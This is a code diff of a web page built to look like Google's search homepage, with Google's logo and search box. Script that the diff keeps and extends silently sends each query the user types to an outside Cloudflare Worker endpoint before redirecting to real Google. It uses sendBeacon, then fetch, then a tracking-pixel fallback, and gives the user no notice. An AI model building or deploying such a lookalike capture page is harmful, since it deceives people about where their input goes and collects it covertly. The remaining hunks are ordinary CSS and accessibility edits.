@@ -37,6 +37,7 @@
     .app-grid div { width:3px; height:3px; background:var(--icon); border-radius:50%; }
     .app-grid:hover { background:rgba(95,99,104,0.15); }
     .sign-in { background:#1a73e8; color:#fff; padding:8px 14px; border-radius:var(--r-pill); text-decoration:none; font-weight:500; font-size:14px; }
+
     main { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding-top:18vh; }
     .logo img { width:204px; height:auto; transition:filter .3s ease; }
     @media (prefers-color-scheme: dark) { .logo img { filter: brightness(0) invert(1); } }
@@ -48,9 +49,7 @@
       transition:background .3s ease, color .3s ease, box-shadow .2s ease;
     }
     @media (prefers-color-scheme: dark) { .search input { background:#4e5156; color:#e8eaed; } }
-    .search input:focus-visible {
-      box-shadow: 0 0 0 3px var(--focus);
-    }
+    .search input:focus-visible { box-shadow: 0 0 0 3px var(--focus); }
 
     .material-symbols-outlined {
       font-variation-settings:'FILL' 0,'wght' 400,'GRAD' 0,'opsz' 24;
@@ -71,9 +70,7 @@
     footer a { color:var(--text); opacity:.9; text-decoration:none; font-size:14px; margin:0 8px; }
     footer a:hover { text-decoration:underline; }
 
-    @media (prefers-reduced-motion: reduce) {
-      .logo img { transition: none; }
-    }
+    @media (prefers-reduced-motion: reduce) { .logo img { transition: none; } }
   </style>
 </head>
 <body>
@@ -94,13 +91,16 @@
 
   <main>
     <div class="logo" aria-hidden="true">
-      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="">
+      <!-- Explicit width/height trims CLS for the LCP image -->
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+           alt="" width="204" height="69" fetchpriority="high">
     </div>
 
-    <form id="search" class="search" action="https://www.google.com/search" method="GET" role="search" target="_self">
+    <form id="search" class="search" action="https://www.google.com/search" method="GET" role="search" target="_self" novalidate>
       <span id="searchButton" class="material-symbols-outlined search-icon" title="Search" role="button" tabindex="0" aria-label="Search">search</span>
       <input id="q" name="q" type="search" placeholder="Search" aria-label="Search"
-             autocomplete="on" spellcheck="false" autocorrect="off" autocapitalize="none" inputmode="search" />
+             autocomplete="on" spellcheck="false" autocorrect="off" autocapitalize="none"
+             enterkeyhint="search" inputmode="search" autofocus />
       <span class="material-symbols-outlined mic" aria-hidden="true">mic</span>
       <span class="material-symbols-outlined camera" aria-hidden="true">photo_camera</span>
     </form>
@@ -116,19 +116,27 @@
     <a href="#">Settings</a>
   </footer>
 
-  <noscript>
-    <!-- Without JS, the form still goes to Google. The Worker capture won’t run. -->
-  </noscript>
+  <noscript><!-- Without JS, the form still goes to Google. The Worker capture won’t run. --></noscript>
 
   <script defer>
-    // ⚙️ Point this to your Cloudflare Worker endpoint (no trailing slash)
+    // ⚙️ Point this to your Cloudflare Worker endpoint (no trailing slash).
     // Example: 'https://google-reveal.avishaierel.workers.dev'
     const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';
 
-    function sendToBackend(q){
-      const params = new URLSearchParams({ q });
-      const url = (ENDPOINT || '').replace(/\/$/, '') + '/api/save';
+    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
 
+    function backendUrl() {
+      if (!ENDPOINT) return null;
+      return (ENDPOINT || '').replace(/\/$/, '') + '/api/save';
+    }
+
+    function sendToBackend(q){
+      const url = backendUrl();
+      if (!url) return; // no-op if endpoint not configured
+
+      const params = new URLSearchParams({ q });
+
+      // Try sendBeacon first for reliability on navigation
       try {
         if (navigator.sendBeacon) {
           const blob = new Blob([params.toString()], {
@@ -139,6 +147,7 @@
         }
       } catch(_) { /* fall through */ }
 
+      // Fallback to fetch (keepalive helps during navigation)
       if (typeof fetch === 'function') {
         fetch(url, {
           method: 'POST',
@@ -150,32 +159,49 @@
         return;
       }
 
-      // Ultimate fallback: GET
+      // Ultimate fallback: GET pixel
       (new Image()).src = url + '?' + params.toString();
     }
 
+    // DOM hooks
     const form = document.getElementById('search');
     const input = document.getElementById('q');
     const searchBtn = document.getElementById('searchButton');
     const navLinks = document.querySelectorAll('.nav a');
 
+    // Simple active tab toggle (no navigation)
     navLinks.forEach(link => {
       link.addEventListener('click', e => {
         navLinks.forEach(l => l.classList.remove('active'));
-        e.target.classList.add('active');
+        e.currentTarget.classList.add('active');
       });
     });
+
+    // Choose Google endpoint per device (desktop keeps the home with filled box)
+    function setGoogleAction() {
+      form.action = isMobile ? 'https://www.google.com/search'
+                             : 'https://www.google.com/webhp';
+    }
+    setGoogleAction();
 
     // Submit path: capture early, send to backend, then allow navigation to Google
     form.addEventListener('submit', function(){
       const q = (input.value || '').trim();
-      if (q) sendToBackend(q);
+      if (!q) return;
+      sendToBackend(q);
+      // For desktop "webhp", ensure query still gets applied:
+      // If action is /webhp, append ?q=... to the URL so the query appears in the box.
+      if (!isMobile) {
+        const u = new URL(form.action);
+        u.searchParams.set('q', q);
+        form.action = u.toString();
+      }
     }, { capture:true });
 
     // Clickable search icon behaves like a submit button
     function triggerSearch(){
       const q = (input.value || '').trim();
-      if (q) { sendToBackend(q); form.submit(); } else { input.focus(); }
+      if (q) { sendToBackend(q); form.requestSubmit(); } else { input.focus(); }
     }
     searchBtn.addEventListener('click', triggerSearch);
     searchBtn.addEventListener('keydown', (e) => {
